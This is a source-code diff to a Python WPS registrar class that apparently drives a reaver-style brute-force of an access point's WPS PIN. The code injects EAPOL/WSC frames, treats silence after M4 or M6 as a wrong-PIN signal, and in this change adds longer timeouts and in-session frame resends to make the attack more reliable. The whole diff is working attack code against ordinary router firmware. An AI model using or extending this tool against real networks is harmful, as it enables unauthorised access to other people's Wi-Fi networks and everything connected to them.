@@ -89,23 +89,32 @@ class WpsRegistrar:
         bssid: bytes,
         our_mac: bytes,
         msg_timeout: float = 3.0,
-        eapol_start_timeout: float = 2.0,
+        eapol_start_timeout: float = 7.0,
         overall_timeout: float = 25.0,
+        max_resends: int = 2,
         log=None,
     ):
         self.t = transport
         self.bssid = bssid
         self.our_mac = our_mac
         # Per-message receive window. A cheap AP can take seconds to compute the
-        # next WSC message (DH + key derivation), so this is deliberately
-        # generous; bully seeds its M3 wait in the tens of seconds.
+        # next WSC message (DH ≈ 1.2s measured; M1 up to ~3.4s on the AirLink), so
+        # these are deliberately generous — a window shorter than the AP's real
+        # latency causes premature resends that confuse the exchange.
         self.msg_timeout = msg_timeout
         self.eapol_start_timeout = eapol_start_timeout
         self.overall_timeout = overall_timeout
+        # In-session resend: our injected frames land no-ACK/no-retry (wcid=0xff), so a
+        # dropped M2/M4/M6 (or our M4 never reaching the AP) stalls the exchange. On a
+        # per-stage timeout, resend the LAST frame in the SAME session (no MAC rotation) up
+        # to this many times before conceding. The budget refreshes each time the AP replies.
+        self.max_resends = max_resends
         self.log = log or logger.debug
+        self._last_1x_frame: Optional[bytes] = None
 
     async def _send_1x(self, payload_1x: bytes) -> None:
         frame = M.build_data_frame(self.bssid, self.our_mac, self.bssid, payload_1x)
+        self._last_1x_frame = frame
         await self.t.send(frame)
 
     async def try_pin(self, pin: str) -> AttemptOutcome:
@@ -125,6 +134,8 @@ class WpsRegistrar:
         # rather than re-emitting a stale M2 after we've moved on to M4.
         highest_mt = 0
         reached_m1 = False           # did the AP send M1 (WSC exchange actually started)?
+        resends_left = self.max_resends   # in-session resend budget; refreshed on each AP reply
+        self._last_1x_frame = None
 
         def _out(result: PinResult, **kw) -> AttemptOutcome:
             # Every outcome carries reached_m1 so the campaign can tell a silent AP
@@ -145,13 +156,20 @@ class WpsRegistrar:
             frame = await self.t.recv(min(timeout, overall_deadline - time.monotonic()))
             timeout = self.msg_timeout
             if frame is None:
-                # No reply within the window. After M4/M6 a silent drop is the
-                # half-wrong oracle (reaver's timeout-as-NACK); otherwise the AP
-                # just isn't talking.
-                # Distinguish an explicit NACK (logged above) from timeout-as-NACK: a
-                # *silent* drop after M4/M6 is only ASSUMED wrong. If a correct first half
-                # ever reads as wrong, this is the line to look for — it means the AP's M5
-                # never reached us (lost/late), not that it said no.
+                # No reply in the window. Our injected frames land no-ACK/no-retry, so the
+                # likeliest cause is a dropped frame (our last one never reached the AP, or
+                # the AP's reply was lost) — resend the last frame in-session (no MAC
+                # rotation) before inferring anything from the silence.
+                if resends_left > 0 and self._last_1x_frame is not None:
+                    resends_left -= 1
+                    self.log(f"[WPS] no reply (last_sent={last_sent or 'start'}) — resending "
+                             f"in-session ({resends_left} left)")
+                    await self.t.send(self._last_1x_frame)
+                    continue
+                # Resends exhausted. After M4/M6 a silent drop is the half-wrong oracle
+                # (reaver's timeout-as-NACK); an explicit NACK (logged above, config_error
+                # set) is a real rejection. If a correct first half ever reads as wrong via
+                # THIS line, the AP's M5 was lost, not refused.
                 if last_sent == "M4":
                     self.log("[WPS] no reply after M4 → assuming first-half-wrong "
                              "(timeout-as-NACK; an M5 may have been lost)")
@@ -208,6 +226,7 @@ class WpsRegistrar:
                 continue
             if mt in (M.WPS_M1, M.WPS_M3, M.WPS_M5, M.WPS_M7):
                 highest_mt = mt
+                resends_left = self.max_resends   # AP advanced a stage → fresh resend budget
             if mt == M.WPS_M1:
                 reached_m1 = True        # the AP is talking WSC, whatever happens next
                 pke = p.attrs.get(M.ATTR_PUBLIC_KEY)
